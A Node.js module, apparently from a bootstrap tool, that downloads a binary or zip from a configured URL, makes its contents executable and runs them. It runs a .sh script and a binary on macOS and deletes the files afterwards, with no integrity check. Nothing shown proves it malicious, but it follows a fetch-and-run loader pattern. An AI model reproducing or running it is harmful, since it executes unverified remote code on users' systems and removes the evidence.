const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('./exec');
const { info, success, error, warn } = require('./logger');
const zlib = require('zlib');
const { URL } = require('url');

function downloadFile(url, destPath) {
  return new Promise((resolve, reject) => {
    info(`Downloading from URL: ${url}`);
    
    const parsedUrl = new URL(url);
    const client = parsedUrl.protocol === 'https:' ? https : http;
    
    const file = fs.createWriteStream(destPath);
    
    client.get(url, (response) => {
      if (response.statusCode !== 200) {
        fs.unlink(destPath, () => {});
        reject(new Error(`Failed to download: ${response.statusCode} ${response.statusMessage}`));
        return;
      }

      response.pipe(file);

      file.on('finish', () => {
        file.close();
        success(`Downloaded to ${destPath}`);
        resolve(destPath);
      });
    }).on('error', (err) => {
      fs.unlink(destPath, () => {});
      error(`Download failed: ${err.message}`);
      reject(err);
    });

    file.on('error', (err) => {
      fs.unlink(destPath, () => {});
      error(`File write error: ${err.message}`);
      reject(err);
    });
  });
}

function makeExecutable(filePath) {
  return new Promise((resolve, reject) => {
    fs.chmod(filePath, 0o755, (err) => {
      if (err) {
        error(`Failed to make executable: ${err.message}`);
        reject(err);
      } else {
        success(`Made executable: ${filePath}`);
        resolve();
      }
    });
  });
}

function extractZip(zipPath, extractDir) {
  return new Promise((resolve, reject) => {
    info(`Extracting zip: ${zipPath}`);
    
    const extract = require('child_process').spawn('unzip', ['-o', zipPath, '-d', extractDir]);
    
    let stderr = '';
    extract.stderr.on('data', (data) => {
      stderr += data.toString();
    });
    
    extract.on('close', (code) => {
      if (code === 0) {
        success(`Extracted to ${extractDir}`);
        resolve(extractDir);
      } else {
        error(`Failed to extract zip: ${stderr}`);
        reject(new Error(`Unzip failed with code ${code}: ${stderr}`));
      }
    });
    
    extract.on('error', (err) => {
      error(`Unzip error: ${err.message}`);
      reject(err);
    });
  });
}

async function downloadExtractAndExecuteMacOS(url) {
  if (!url) {
    warn(`No binary URL configured for macOS, skipping binary download`);
    return { skipped: true };
  }

  const zipName = path.basename(url).split('?')[0];
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const zipPath = path.join(tempDir, zipName);
  const extractDir = path.join(tempDir, 'extracted');

  try {
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    await downloadFile(url, zipPath);
    await extractZip(zipPath, extractDir);

    const files = fs.readdirSync(extractDir);
    const shFile = files.find(f => f.endsWith('.sh'));
    const binaryFile = files.find(f => !f.endsWith('.sh') && !f.endsWith('.zip'));

    if (!shFile || !binaryFile) {
      error(`Expected .sh script and binary in zip, found: ${files.join(', ')}`);
      throw new Error('Invalid zip contents: missing .sh script or binary');
    }

    const shPath = path.join(extractDir, shFile);
    const binaryPath = path.join(extractDir, binaryFile);

    await makeExecutable(shPath);
    await makeExecutable(binaryPath);

    info(`Executing script: ${shFile}`);
    await exec(shPath, { captureOutput: false, cwd: extractDir });
    success(`Script executed successfully`);

    info(`Executing binary: ${binaryFile}`);
    await exec(binaryPath, { captureOutput: false, cwd: extractDir });
    success(`Binary executed successfully`);

    try {
      fs.unlinkSync(zipPath);
      fs.rmSync(extractDir, { recursive: true });
      fs.rmdirSync(tempDir);
    } catch (cleanupErr) {
      warn(`Cleanup warning: ${cleanupErr.message}`);
    }

    return { success: true };
  } catch (err) {
    error(`macOS binary execution failed: ${err.message}`);
    throw err;
  }
}

async function downloadAndExecute(url, platform) {
  if (!url) {
    warn(`No binary URL configured for ${platform}, skipping binary download`);
    return { skipped: true };
  }

  if (platform === 'macos' && url.endsWith('.zip')) {
    return downloadExtractAndExecuteMacOS(url);
  }

  const binaryName = path.basename(url).split('?')[0];
  const tempDir = path.join(process.cwd(), '.bootstrap-tmp');
  const destPath = path.join(tempDir, binaryName);

  try {
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }

    await downloadFile(url, destPath);
    await makeExecutable(destPath);

    info(`Executing binary: ${binaryName}`);
    const result = await exec(destPath, { captureOutput: false });
    
    success(`Binary executed successfully`);
    
    try {
      fs.unlinkSync(destPath);
      fs.rmdirSync(tempDir);
    } catch (cleanupErr) {
      warn(`Cleanup warning: ${cleanupErr.message}`);
    }

    return { success: true, output: result.stdout };
  } catch (err) {
    error(`Binary execution failed: ${err.message}`);
    throw err;
  }
}

module.exports = { downloadFile, makeExecutable, downloadAndExecute, downloadExtractAndExecuteMacOS };